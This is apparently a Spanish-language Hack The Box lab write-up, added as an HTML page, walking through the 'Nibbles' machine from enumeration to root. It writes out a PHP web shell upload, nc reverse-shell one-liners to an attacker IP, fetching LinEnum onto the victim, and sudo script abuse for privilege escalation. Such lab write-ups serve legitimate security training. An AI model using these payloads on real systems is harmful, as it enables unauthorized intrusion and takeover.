@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Ejercicios Resueltos en Ciberseguridad - HTB Nibbleblog">
+    <title>Metahumo | Ejercicios Resueltos - HTB Nibbleblog</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>Ejercicios Resueltos</h1>
+        <p>Metahumo - Espacio de aprendizaje en Ciberseguridad</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="../">Inicio</a></li>
+            <li><a href="./" class="active">Ejercicios Resueltos</a></li>
+            <li><a href="../herramientas/">Herramientas</a></li>
+            <li><a href="../traducciones/">Traducciones</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <!-- Contenido convertido de HTB_Nibbleblog.md -->
+        <article>
+            <h1>HTB - Explotación de Nibbleblog</h1>
+            <h3>Exención de responsabilidad</h3>
+            <p>
+                Este contenido tiene fines educativos y está diseñado para ser utilizado únicamente en entornos controlados y con permisos explícitos.
+                Hack The Box y otras plataformas similares proporcionan entornos de práctica legalmente autorizados, y se debe asegurar que se cuenta con los permisos adecuados antes de realizar cualquier prueba de penetración o hacking ético.
+            </p>
+            <p>
+                El autor de esta publicación no se responsabiliza por el uso indebido de las técnicas y herramientas descritas fuera de los entornos legales y éticos correspondientes.
+            </p>
+
+            <h2>Índice</h2>
+            <ol>
+                <li><a href="#fase-i-enumeracion-y-acceso">Fase I: Enumeración y Acceso</a>
+                    <ul>
+                        <li>Escaneo de puertos con <code>nmap</code></li>
+                        <li>Identificación de tecnologías con <code>whatweb</code></li>
+                        <li>Descubrimiento de rutas con <code>gobuster</code></li>
+                        <li>Explotación de subida de archivos</li>
+                    </ul>
+                </li>
+                <li><a href="#fase-ii-escalada-de-privilegios">Fase II: Escalada de Privilegios</a>
+                    <ul>
+                        <li>Uso de <code>LinEnum</code> para encontrar vectores de escalación</li>
+                        <li>Abuso de permisos en scripts</li>
+                        <li>Obtención de <code>root</code></li>
+                    </ul>
+                </li>
+            </ol>
+
+            <h2 id="fase-i-enumeracion-y-acceso">Fase I: Enumeración y acceso</h2>
+            <h3>0. Nota: Asegúrese de estar ejecutando <code>sudo openvpn ARCHIVO_DE_VPN_DESCARGADO</code> y usar IP tur0 de la VPN</h3>
+            
+            <h3>1. Escaneo de puertos con Nmap</h3>
+            <pre><code class="language-bash">nmap -sV --open -oA Upload_php_initial_scan -n -Pn -sS -v 10.129.168.126
+nmap -p22,80 -Pn -n -sS -v -sC -oA port_scan 10.129.168.126</code></pre>
+            
+            <h3>2. Verificación de la web con cURL</h3>
+            <pre><code class="language-bash">curl http://10.129.168.126:80</code></pre>
+            <p>Salida:</p>
+            <pre><code class="language-html">&lt;b&gt;Hello world!&lt;/b&gt;
+&lt;!-- /nibbleblog/ directory...! --&gt;</code></pre>
+            <p>[### Encontramos directorio interesante ###]</p>
+            
+            <h3>3. Identificación de tecnologías con WhatWeb</h3>
+            <pre><code class="language-bash">whatweb http://10.129.168.126:80/nibbleblog</code></pre>
+            
+            <h3>4. Extracción de configuraciones con cURL</h3>
+            <pre><code class="language-bash">curl http://10.129.168.126/nibbleblog/content/private/config.xml | xmllint --format -</code></pre>
+            <p>Salida:</p>
+            <pre><code class="language-xml">&lt;notification_email_to type="string"&gt;admin@nibbles.com&lt;/notification_email_to&gt;
+&lt;notification_email_from type="string"&gt;noreply@10.10.10.134&lt;/notification_email_from&gt;
+&lt;seo_site_title type="string"&gt;Nibbles - Yum yum&lt;/seo_site_title&gt;</code></pre>
+            
+            <h3>5. Enumeración de directorios con Gobuster</h3>
+            <pre><code class="language-bash">gobuster dir -u http://10.129.168.126:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30
+gobuster dir -u http://10.129.168.126/nibbleblog/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt</code></pre>
+            <p>Resultados relevantes:</p>
+            <pre><code>/README               (Status: 200) [Size: 4628]
+/admin                (Status: 301) [--> http://10.129.168.126/nibbleblog/admin/]
+/admin.php            (Status: 200) [Size: 1401]
+/content              (Status: 301) [--> http://10.129.168.126/nibbleblog/content/]</code></pre>
+            
+            <h3>6. Lectura del README</h3>
+            <pre><code class="language-bash">curl http://10.129.168.126/nibbleblog/README</code></pre>
+            <p>Salida:</p>
+            <pre><code>Version: v4.0.3
+Codename: Coffee
+Release date: 2014-04-01</code></pre>
+            
+            <h3>7. Prueba de credenciales</h3>
+            <pre><code>Usuario: admin
+Contraseña: nibb...  (vemos que se repite dos veces en el encaezado, por lo que deducimos que se puede probar)</code></pre>
+            <p>Accedemos con éxito a la administración de Nibbleblog.</p>
+            
+            <h3>8. Subida de una Web Shell</h3>
+            <p><strong>Creamos un archivo PHP malicioso:</strong></p>
+            <pre><code class="language-bash">nvim shell.php</code></pre>
+            <p>Contenido:</p>
+            <pre><code class="language-php">&lt;?php system('id'); ?&gt;</code></pre>
+            <p>Subimos el archivo a la administración de Nibbleblog y verificamos ejecución:</p>
+            <pre><code class="language-bash">curl http://10.129.168.126/nibbleblog/content/private/plugins/my_image/image.php</code></pre>
+            <p>Salida:</p>
+            <pre><code>uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)</code></pre>
+            
+            <h3>9. Obtención de Shell Reversa</h3>
+            <p><strong>Creamos un archivo PHP con una Reverse Shell:</strong></p>
+            <pre><code class="language-php">&lt;?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1234 &gt;/tmp/f"); ?&gt;</code></pre>
+            <p><strong>Abrimos un listener en el atacante (AT):</strong></p>
+            <pre><code class="language-bash">nc -lvnp 1234</code></pre>
+            <p><strong>Ejecutamos la shell remota:</strong></p>
+            <pre><code class="language-bash">curl http://10.129.168.126/nibbleblog/content/private/plugins/my_image/image.php</code></pre>
+            <p>Obtenemos una shell interactiva:</p>
+            <pre><code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+            
+            <h3>10. Extracción de archivos comprimidos</h3>
+            <pre><code class="language-bash">gzip -d personal.zip</code></pre>
+            
+            <h3>11. Obtención de la flag de usuario</h3>
+            <pre><code class="language-bash">cat /home/nibbler/flag.txt</code></pre>
+            <p>Salida:</p>
+            <pre><code>79c03865431abf47b90ef24......</code></pre>
+            
+            <h2 id="fase-ii-escalada-de-privilegios">Fase II: Escalada de privilegios</h2>
+            <h3>Opción 1: Uso de <code>LinEnum</code></h3>
+            <h4>1. Transferir y ejecutar <code>LinEnum.sh</code></h4>
+            <p>En la máquina atacante:</p>
+            <pre><code class="language-bash">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+python3 -m http.server 1234</code></pre>
+            <p>En la máquina víctima:</p>
+            <pre><code class="language-bash">wget http://10.10.10.X:1234/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh</code></pre>
+            <p>Analizamos la salida y encontramos permisos sobre <code>monitor.sh</code>.</p>
+            
+            <h4>2. Manipulación del script <code>monitor.sh</code></h4>
+            <pre><code class="language-bash">echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1235 &gt;/tmp/f' | tee -a monitor.sh</code></pre>
+            
+            <h4>3. Escuchar conexión en la máquina atacante</h4>
+            <pre><code class="language-bash">nc -lvnp 1235</code></pre>
+            
+            <h4>4. Ejecutar el script con privilegios</h4>
+            <pre><code class="language-bash">sudo /home/nibbler/personal/stuff/monitor.sh</code></pre>
+            <p>Obtendremos acceso como <code>root</code>. Buscamos la flag:</p>
+            <pre><code class="language-bash">cat /root/flag_root.txt</code></pre>
+            <p>Flag:<br>de5e5d6619862a8aa5b9b2......</p>
+            
+            <h3>Opción 2: Abuso de permisos <code>sudo</code></h3>
+            <h4>1. Verificar permisos con <code>sudo -l</code></h4>
+            <pre><code class="language-bash">sudo -l</code></pre>
+            <p>Salida esperada:</p>
+            <pre><code>(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</code></pre>
+            
+            <h4>2. Insertar código de shell reversa en <code>monitor.sh</code></h4>
+            <pre><code class="language-bash">echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1235 &gt;/tmp/f' | tee -a monitor.sh</code></pre>
+            
+            <h4>3. Escuchar conexión en la máquina atacante</h4>
+            <pre><code class="language-bash">nc -lvnp 1235</code></pre>
+            
+            <h4>4. Ejecutar el script como <code>root</code></h4>
+            <pre><code class="language-bash">sudo /home/nibbler/personal/stuff/monitor.sh</code></pre>
+            <p>Obtendremos acceso como <code>root</code>. Buscamos la flag:</p>
+            <pre><code class="language-bash">cat /root/flag_root.txt</code></pre>
+            <p>Flag:<br>de5e5d6619862a8aa5b9b21......</p>
+            
+            <hr>
+            <h2>Notas finales</h2>
+            <p>Este ejercicio de HTB nos ha permitido practicar:</p>
+            <ul>
+                <li>Enumeración de servicios y directorios.</li>
+                <li>Explotación de un panel de administración vulnerable.</li>
+                <li>Carga de una Web Shell para ejecución remota de comandos.</li>
+                <li>Obtención de una Reverse Shell interactiva.</li>
+                <li>Escalada de privilegios a root mediante un script con permisos de sudo.</li>
+                <li>Esta explicación es una simplificación de la más extendida, y maravillosa, que se encuentra en: <a href="https://academy.hackthebox.com/module/details/77" target="_blank">Hack The Box Academy</a></li>
+            </ul>
+            
+            <h2>Consideraciones Éticas y Legales</h2>
+            <p>
+                Esta documentación se proporciona <strong>exclusivamente con fines educativos</strong>.<br>
+                Las técnicas y procedimientos descritos están diseñados para ser aplicados en <strong>entornos controlados</strong>, como laboratorios personales o plataformas de formación como Hack The Box.
+            </p>
+            <p>
+                ⚠ <strong>IMPORTANTE:</strong><br>
+                El uso indebido de estos conocimientos en sistemas sin autorización constituye una violación de la ley y puede acarrear consecuencias legales graves.<br>
+                Antes de realizar cualquier prueba de seguridad, asegúrate de contar con el <strong>consentimiento expreso</strong> del propietario del sistema.
+            </p>
+            <h3>Asegúrate de:</h3>
+            <ul>
+                <li>Realizar pruebas solo en máquinas y entornos de <strong>pruebas de penetración legal</strong>.</li>
+                <li>Nunca realizar pruebas en sistemas sin tener <strong>permiso explícito</strong> para hacerlo.</li>
+            </ul>
+            <p>
+                Para más información sobre prácticas de hacking ético, puedes revisar los términos y condiciones de Hack The Box en: <br>
+                🔗 <a href="https://www.hackthebox.com/terms" target="_blank">https://www.hackthebox.com/terms</a>
+            </p>
+        </article>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 Metahumo | Licencia Creative Commons Zero v1.0 Universal (CC0)</p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
